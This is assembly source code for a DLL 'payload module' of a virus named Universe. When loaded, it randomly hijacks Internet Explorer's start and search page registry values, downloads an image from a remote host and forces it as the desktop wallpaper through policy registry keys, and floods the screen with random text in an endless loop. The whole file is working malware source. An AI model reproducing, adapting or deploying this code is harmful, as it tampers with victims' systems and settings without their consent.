;payload module, part of Universe project.


.386p
.model	flat

include	..\win32api.inc
include	..\useful.inc


invoke	macro	api					;macro for API callz
	extrn	api:PROC				;declare API
	call	api					;call it...
endm


.data
	jpg_name	db	MAX_PATH+14 dup (?)	;filename to jpg file
	str		db	8192 dup (?)		;garbage buffer
	tmp		dd	?

.code
Start:	mov	ecx,[esp+8]
	dec	ecx
	jecxz	perform_action			;must be DLL_PROCESS_ATTACH (1)
	ret

perform_action:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>

	invoke	GetTickCount			;get random number
	xor	edx,edx
	mov	ecx,10
	div	ecx
	cmp	edx,2
	jne	p_next				;1:10 probability
	call	set_msie			;got it, do a payload
p_next:	invoke	GetTickCount			;get random number
	xor	edx,edx
	mov	ecx,30
	div	ecx
	cmp	edx,2
	jne	p_next2				;1:30 probability
	call	set_wallpaper			;got it, do a payload
p_next2:invoke	GetTickCount			;get random number
	xor	edx,edx
	mov	ecx,30
	div	ecx
	cmp	edx,2
	jne	end_seh				;1:30 probability
	call	show_graphics			;got it, do a payload
end_seh:@SEH_RemoveFrame			;and quit
	popad
err_dm:	ret


;display random garbage on the screen
show_graphics	Proc
	push	0
	push	1
	push	0
	@pushsz	'Universe'
	push	offset cProvider
	invoke	CryptAcquireContextA		;get handle to crypto provider
	dec	eax
	jne	err_dm

	push	0
	invoke	GetDC				;get HWND to desktop
	xchg	eax,ebx
	push	0000FF00h
	push	ebx
	invoke	SetTextColor			;set green text color
	push	0
	push	ebx
	invoke	SetBkColor			;set black background color

dspl:	push	offset str
	push	8192
	push	12345678h
cProvider = dword ptr $-4
	invoke	CryptGenRandom			;generate random garbage thru
						;crypto provider
	push	1 or 4 or 100h or 800h
	call	@rct
	dd	0
	dd	0
	dd	800
	dd	600
@rct:	push	8192
	push	offset str
	push	ebx
	invoke	DrawTextA			;show it on the screen
	jmp	dspl				;infinite loop, nice effect :-)
show_graphics	EndP


;set users wallpaper to my favourite psychedelic bitmap :-)
set_wallpaper	Proc
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	@pushsz	'Universe'
	invoke	InternetOpenA			;create the inet handle
	test	eax,eax
	jne	ok_ioa
	ret

ok_ioa:	xchg	eax,ebx
	xor	eax,eax
	push	eax
	push	80000000h			;no cache
	push	eax
	push	eax
	@pushsz	'http://shadowvx.gov/benny/viruses/universe/universe.jpg'
	push	ebx
	invoke	InternetOpenUrlA		;open URL
	test	eax,eax
	jne	ok_ioua
	ret

ok_ioua:xchg	eax,edi
	mov	esi,offset jpg_name
	push	esi
	push	MAX_PATH
	push	esi
	invoke	GetSystemDirectoryA
	add	esi,eax
	add	eax,13
	mov	[s_jpg],eax
	mov	[esi],'inu\'
	mov	[esi+4],'srev'
	mov	[esi+8],'pj.e'
	mov	word ptr [esi+12],'g'		;create path+filename
	pop	esi				;for bitmap

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_WRITE or GENERIC_READ
	push	esi
	invoke	CreateFileA			;create that file
	inc	eax
	je	err_dm1
	dec	eax
	mov	[hFile],eax

	cdq
	push	edx
	push	0E000h
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	invoke	CreateFileMappingA
	test	eax,eax
	je	err_dm2
	mov	[hMapFile],eax

	xor	edx,edx
	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	eax
	invoke	MapViewOfFile			;map it
	test	eax,eax
	je	err_dm3
	mov	[lpFile],eax

	push	offset tmp
	push	0E000h
	push	eax
	push	edi
	invoke	InternetReadFile		;read the file
	test	eax,eax
	je	err_dm4

	push	12345678h
s_jpg = dword ptr $-4
	push	offset jpg_name
	push	1
	@pushsz	'Wallpaper'
	@pushsz	'Software\Microsoft\Windows\CurrentVersion\Policies\System'
	push	80000001h
	invoke	SHSetValueA			;set as default wallpaper

	push	[s_jpg]
	push	offset jpg_name
	push	1
	@pushsz	'Wallpaper'
	@pushsz	'SOFTWARE\Microsoft\Internet Explorer\Desktop\General'
	push	80000001h
	invoke	SHSetValueA			;yeah, here too to be sure ;)


err_dm4:push	12345678h
lpFile = dword ptr $-4
	invoke	UnmapViewOfFile			;unmap file
err_dm3:push	12345678h
hMapFile = dword ptr $-4
	invoke	CloseHandle
err_dm2:push	12345678h
hFile = dword ptr $-4
	invoke	CloseHandle			;close file
err_dm1:push	edi
	invoke	InternetCloseHandle		;close all inet handlez
err_dm0:push	ebx
	invoke	InternetCloseHandle		;close all inet handlez
	ret
set_wallpaper	EndP


;set MSIEs standard URLs to http://www.therainforestsite.com
set_msie	Proc
	call	@m_reg
	db	'Default_Page_URL',0		;item table
	db	'Default_Search_URL',0
	db	'Search Page',0
	db	'Start Page',0
	db	'What''s New',0
	db	'Local Page',0
@m_reg:	pop	esi

	push	6
	pop	ecx
m_loop:	push	ecx
	push	32
	@pushsz	'http://www.therainforestsite.com'	;destination URL
	push	1
	push	esi
	@pushsz	'Software\Microsoft\Internet Explorer\Main'
	push	80000002h			;key
	call	SHSetValueA			;set the value

	@endsz
	pop	ecx
	loop	m_loop
	ret
set_msie	EndP
End	Start
